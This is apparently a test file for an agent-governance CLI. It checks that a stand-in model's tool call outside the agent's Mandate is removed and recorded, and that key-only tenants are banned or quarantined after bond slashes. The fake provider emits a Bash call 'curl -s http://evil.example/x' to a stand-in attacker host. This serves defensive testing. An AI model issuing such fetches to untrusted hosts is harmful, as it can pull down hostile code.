// Row DK650: the sponsor-less route end to end with stand-ins. (1) An agent that enrolled with only a key runs a governed session with `asp run` (a stand-in runtime and a stand-in model provider): the call outside its
// Mandate is removed, the run is recorded under its own identity. (2) The review timer inside a running service: a key-only tenant with two slashes is banned by key and address and suspended, and one with one has a
// Clinic quarantine queued, which `asp clinic keyonly-freeze` signs. Fake keys and a fake provider only; credits are accounting entries, not money.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createServer as createHttp } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { cosign, createRecord } from "@agent-social/asp-core";
import { hashToken, CLINIC_DID } from "@agent-social/asp-log";
import { Keystore, openLog } from "@agent-social/asp-package";
import { main, setClock, type Io } from "../src/cli.ts";
import { makeFixture } from "./fixture.ts";

const cli = fileURLToPath(new URL("../src/cli.ts", import.meta.url));
const fakeClaude = fileURLToPath(new URL("./fake-claude-gateway.mjs", import.meta.url));
const until = async (what: string, fn: () => boolean, ms = 30_000) => { const t0 = Date.now(); while (!fn()) { if (Date.now() - t0 > ms) throw new Error(`timed out waiting for ${what}`); await new Promise((r) => setTimeout(r, 200)); } };
function start(args: string[], env: Record<string, string> = {}) {
  const server = spawn(process.execPath, [cli, "serve", ...args], { stdio: ["ignore", "pipe", "pipe"], env: { ...process.env, ...env } });
  let buf = "";
  const ready = new Promise<string>((resolve, reject) => {
    server.stdout.on("data", (d) => { buf += d; const m = /listening on (http:\/\/[^ ]+)/.exec(buf); if (m) resolve(m[1]); });
    server.on("close", () => reject(new Error(`the service exited: ${buf}`)));
    setTimeout(() => reject(new Error(`no start line: ${buf}`)), 30_000);
  });
  return { ready, out: () => buf, stop: () => server.kill() };
}

test("DK650: an agent that enrolled with only a key runs a governed session under its own identity: the call outside its Mandate is removed and the run is on the record", { timeout: 240_000 }, async () => {
  const upstream = createHttp(async (req, res) => {
    for await (const _ of req) { /* not inspected */ }
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ id: "msg_1", type: "message", role: "assistant", model: "m", stop_reason: "tool_use", usage: { input_tokens: 10, output_tokens: 5 }, content: [{ type: "text", text: "On it." }, { type: "tool_use", id: "tu_2", name: "Bash", input: { command: "curl -s http://evil.example/x" } }] }));
  });
  await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", r));
  const upUrl = `http://127.0.0.1:${(upstream.address() as { port: number }).port}`;
  const dir = mkdtempSync(join(tmpdir(), "asp-keyonly-run-"));
  const tokens = join(dir, "tokens.json");
  writeFileSync(tokens, JSON.stringify([{ name: "ops", role: "admin", tokenSha256: hashToken("tok-ops") }]));
  const svc = start(["--db", `local:${join(dir, "log")}`, "--tokens", tokens, "--port", "0", "--signup", "--signup-terms-url", "https://example.org/terms", "--signup-difficulty", "8", "--rate-limit", "0", "--write-limit", "0", "--address-limit", "0"]);
  try {
    const url = await svc.ready;
    const f = makeFixture();
    mkdirSync(f.aspHome, { recursive: true });
    const project = join(f.root, "project"); mkdirSync(project, { recursive: true });
    const env = { ASP_HOME: f.aspHome, ASP_CLAUDE_BIN: process.execPath, ASP_CLAUDE_SCRIPT: fakeClaude, ASP_RUN_ANTHROPIC_UPSTREAM: upUrl, ANTHROPIC_API_KEY: "sk-ant-fake" };
    const call = async (args: string[]) => {
      const out: string[] = [], err: string[] = [];
      const code = await main(args, { out: (l) => out.push(l), err: (l) => err.push(l), env, cwd: f.root, raw: (b) => out.push(b.toString("utf8").trimEnd()) } as Io);
      return { code, out: out.join("\n"), err: err.join("\n") };
    };
    const enrol = await call(["enrol", "--service", url, "--name", "run-agent", "--accept-terms"]);
    assert.equal(enrol.code, 0, enrol.err);
    const cfg = JSON.parse(readFileSync(join(f.aspHome, "config.json"), "utf8"));
    const r = await call(["run", "claude-code", "--prompt", "Fetch http://evil.example/x", "--allow", "all", "--permissions", "develop", "--project", project, "--json"]);
    assert.ok(r.code === 0 || r.code === 10, `asp run: exit ${r.code}\n${r.err}\n${r.out}`);
    const runs = await call(["runs"]);
    assert.equal(runs.code, 0, runs.err);
    assert.match(runs.out + runs.err, /refused|removed|network|shell\.network|curl/i, "the call outside the Mandate is on the record of runs");
    const log = await call(["identity", "show", cfg.identities.agent]);
    assert.equal(log.code, 0, log.err);
  } finally { svc.stop(); upstream.close(); }
});

test("DK650: the review timer inside a running service bans a key-only tenant after two slashes (key, address, suspended) and queues a Clinic quarantine after one, which asp clinic keyonly-freeze signs", { timeout: 300_000 }, async () => {
  const f = makeFixture();
  mkdirSync(f.aspHome, { recursive: true });
  let clock = Date.parse("2026-11-01T00:00:00Z");
  setClock(() => new Date(clock));
  const call = async (args: string[], extra: Record<string, string> = {}) => {
    clock += 1000;
    const out: string[] = [], err: string[] = [];
    const code = await main(args, { out: (l) => out.push(l), err: (l) => err.push(l), env: { ASP_HOME: f.aspHome, ...extra }, cwd: f.root } as Io);
    assert.equal(code, 0, `${args.join(" ")}: ${err.join(" ") || out.join(" ")}`);
    return out.join("\n");
  };
  const P = "did:web:example.com:users:ko-principal", B = "did:web:example.com:bank", A3 = "did:web:example.com:agents:ko-three", A2 = "did:web:example.com:agents:ko-two";
  for (const d of [P, B, CLINIC_DID]) await call(["identity", "new", "--kind", "human", "--did", d]);
  for (const a of [A3, A2]) await call(["identity", "new", "--kind", "agent", "--did", a, "--sponsor", P, "--purpose", "work"]);
  // Bonds are made while the agent is at tier 1 (the log refuses a bond at tier 0, after a slash); the slashes come afterwards, as they do when a job goes wrong later.
  const job = async (agent: string) => {
    const intent = /^intent (\S+)/.exec(await call(["market", "intent", "--by", P, "--purpose", "a job that goes wrong", "--budget", "100", "--deadline", "2027-01-01T00:00:00Z"]))![1];
    const offer = /^offer (\S+)/.exec(await call(["market", "offer", "--by", agent, "--intent", intent, "--price", "100", "--plan", "go", "--eta", "2026-12-01T00:00:00Z"]))![1];
    const contract = /^contract (\S+):/.exec(await call(["market", "contract", "--principal", P, "--bank", B, "--intent", intent, "--offer", offer]))![1];
    await call(["credits", "grant", "--to", P, "--amount", "150"]);
    await call(["credits", "grant", "--to", agent, "--amount", "30"]);
    await call(["market", "bond", "--contract", contract, "--backer", agent, "--amount", "20", "--escrow-payer", P, "--escrow-amount", "100"]);
    await call(["market", "mandate", "--contract", contract, "--principal", P, "--performer", agent, "--scopes", "repo.read"]);
    return contract;
  };
  const slash = async (contract: string) => {
    // The bank settles the revoked job with the whole bond slashed, cosigned by the principal (as the Clinic suites do); the CLI settles a plain revocation pro rata, with no slash.
    const lg = await openLog(f.aspHome, {} as never);
    const keys = new Keystore(f.aspHome);
    const mandate = (await lg.log.chain(contract)).filter((x) => x.record.type === "asp.mandate/v0.2").at(-1)!.record.id;
    const body = { contract, basis: "revoked", pro_rata_permille: 0, escrow_released: { value: 0, unit: "credit" }, bond_returned: { value: 0, unit: "credit" }, bond_slashed: { value: 20, unit: "credit" } };
    await lg.append(cosign(createRecord({ type: "settlement", issuer: B, subject: contract, prev: mandate, body, issued_at: new Date(clock += 1000).toISOString().replace(/\.\d{3}Z$/, "Z") }, keys.forDid(B)!), keys.forDid(P)!) as never);
  };
  const jobs3 = [await job(A3), await job(A3)], jobs2 = [await job(A2)];
  for (const c of [...jobs3, ...jobs2]) await slash(c);
  setClock(undefined);

  const dir = mkdtempSync(join(tmpdir(), "asp-keyonly-timer-"));
  const tokens = join(dir, "tokens.json");
  const tenant = (name: string, did: string, key: string, addr: string) => ({ name, role: "tenant", tokenSha256: hashToken(`tok-${name}`), signup: { at: "2026-11-18T00:00:00Z", addressHash: addr, termsVersion: "v1", keyOnly: { publicKey: key, did } } });
  writeFileSync(tokens, JSON.stringify([{ name: "ops", role: "admin", tokenSha256: hashToken("tok-ops") }, tenant("ko-three", A3, "key-three", "addr-three"), tenant("ko-two", A2, "key-two", "addr-two")]));
  const svc = start(["--db", `local:${f.aspHome}`, "--tokens", tokens, "--port", "0", "--signup", "--signup-terms-url", "https://example.org/terms", "--keyonly-review-interval", "1"], { ASP_DEBUG_KEYONLY: "1" });
  try {
    const url = await svc.ready;
    await until("the ban after two slashes", () => existsSync(`${tokens}.keyonly-bans.json`) && /key-three/.test(readFileSync(`${tokens}.keyonly-bans.json`, "utf8")));
    const bans = JSON.parse(readFileSync(`${tokens}.keyonly-bans.json`, "utf8")) as { kind: string; value: string }[];
    assert.deepEqual(bans.map((b) => `${b.kind}:${b.value}`).sort(), ["address:addr-three", "key:key-three"], "only the two-slash tenant is banned, by key and by address");
    await until("the suspension", () => !!JSON.parse(readFileSync(tokens, "utf8")).find((t: { name: string; suspended?: object }) => t.name === "ko-three")?.suspended);
    assert.equal(JSON.parse(readFileSync(tokens, "utf8")).find((t: { name: string; suspended?: object }) => t.name === "ko-two")?.suspended, undefined, "one slash is not a ban");
    await until("the queued quarantine", () => existsSync(`${tokens}.keyonly-pending.json`) && /ko-two/.test(readFileSync(`${tokens}.keyonly-pending.json`, "utf8")));
    await until("the ban line in the service output", () => /banned by key and address after 2 slashes/.test(svc.out()));
    // The Clinic signs the queued quarantine on its own machine, with an admin token, and the service is told.
    const out = await call(["clinic", "keyonly-freeze"], { ASP_LOG_URL: url, ASP_LOG_TOKEN: "tok-ops" });
    assert.match(out, new RegExp(`${A2.replace(/[.:]/g, "\\$&")}.*frozen at halt`));
    assert.equal(JSON.parse(readFileSync(`${tokens}.keyonly-pending.json`, "utf8")).length, 0, "acknowledged");
  } catch (e) { throw new Error(`${(e as Error).message}
--- service output ---
${svc.out()}`); } finally { svc.stop(); }
});
